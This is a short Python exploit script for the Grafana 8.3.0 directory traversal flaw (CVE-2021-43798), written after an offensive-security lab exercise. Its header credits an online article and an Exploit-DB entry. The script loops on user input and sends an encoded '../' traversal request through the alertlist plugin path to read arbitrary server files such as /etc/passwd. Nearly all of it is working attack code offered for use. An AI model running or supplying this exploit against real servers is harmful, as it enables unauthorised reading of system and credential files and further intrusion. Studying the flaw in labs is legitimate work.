# Author: David Rochester 
# Description: Grafana 8.3.0 Directory Traversal (Try this is EDB-ID 50581 is not working!)

# Original Article: https://ethicalhacking.uk/cve-2021-43798-dissecting-the-grafana-path-traversal-vulnerability/#gsc.tab=0

# During a box in OffSec Proving Ground (Fanatastic), I encountered Grafana 8.3.0 and pretty quickly found exploitdb id 50581 but for some reason it was not working.
# I found a working PoC on the above article that quickly allowed me to read /etc/passwd and proceed with attacking the box
# I decided to build off the PoC so it would be a bit more interactive and allow for quick manual enumeration of files to read





import sys
import requests


def read_files(ip, port):
    quit = False
    while (not quit):
        file2read = input("> Enter file to read or type quit to exit: ")
        if file2read == "quit":
            print("Goodbye!")
            exit(0)
        url = f"http://{ip}:{port}/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e{file2read}"
        try:
            resp = requests.get(url)
            if (resp.text is None):
                print("File not read, either due to permissions or doesn't exist")
            else:
                print("Waiting for response...\n\n\n")
                print(resp.text + "\n\n\n")
        except Exception as e:
            print("Error", e)


def main():
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <IP> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    read_files(ip, port)

if __name__ == "__main__":
    main()
